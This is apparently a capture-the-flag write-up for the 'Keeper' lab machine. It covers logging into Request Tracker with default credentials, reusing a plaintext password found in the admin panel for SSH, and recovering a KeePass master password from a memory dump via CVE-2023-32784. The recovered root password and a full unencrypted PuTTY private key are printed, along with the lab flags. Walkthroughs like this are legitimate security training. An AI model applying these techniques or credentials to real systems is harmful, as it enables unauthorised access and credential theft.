# Keeper

## Recon

nmap scan reveals port 22 and 80 are open 

Visit site IP

link:  To raise an IT support ticket, please visit tickets.keeper.htb/rt/ 

edit /etc/hosts to include domain

```
vim /etc/hosts
```

add `<machine ip> keeper.htb tickets.keeper.htb` and write-quit

follow link to login page where we get some additional info

Best Practical Request Tracker

»|« RT 4.4.4+dfsg-2ubuntu1 (Debian) Copyright 1996-2019 Best Practical Solutions, LLC.

Distributed under version 2 of the GNU GPL.
To inquire about support, training, custom development or licensing, please contact sales@bestpractical.com.

Can we find any docs on Best Practical Request Tracker? Yes!

Including default credentials of root:password; don't suppose those will work?

We're logged in!

There appears to be a ticket in the general queue with an ID of 300000 referencing an issue with a windows keepass client

Checking out the only ticket it sounds like a Keepass database and crashdump were sent as part of a ticket. Lise Norgaard downloaded the data to their system and removed the attachment from the ticketing system for security purposes.

Upon further searching we also find credentials for lnorgaard in the admin>users panel

Also note Lise's native language is Danish

```
lnorgaard:Welcome2023!
```

Which also happen to allow login to the system over SSH

```
ssh lnorgaard@keeper.htb

cat user.txt

6f2bf1834e98c501441c1f05efbe1e8e
```

There's also a zip archive called RT30000 in the home directory

```
unzip RT30000.zip

ls

KeePassDumpFull.dmp  passcodes.kdbx  RT30000.zip  user.txt
```

It's the aforementioned KeePass dump and the kdbx too!

Time to crack the kdbx password! It's probably safe to infer that we are to extract the password from the .dmp file per CVE-2023-32784

you can get vdohney's keepass-password-dumper and install .NET 7.0 if necessary or grab the python-based implementation at https://github.com/matro7sh/keepass-dump-masterkey

```
python3 -m poc KeePassDumpFull.dmp

Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

Remember that Lise's native language is danish? `med fløde` in english translates to "with creme". A quick google of "danish drink with creme" reveals `rødgrød med fløde`...looks and sounds good.

Now we can open passcodes.kdbx and have a peek inside.
We find the root password and a putty ssh key in the Network tab along with the ticketing creds we found earlier

```
root:F4><3K0nd!
```

```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

Copy the key and paste it into a file called root.ppk or something similar

Open Putty and import the identity key

Connection > SSH > Auth > Credentials > Browse to add Private Key file under Public Key Authentication

Configure the user as root and add the machine IP and voila!

```
cat root.txt

d8f62605362ac28ec2fefa443ea0f2c3
```


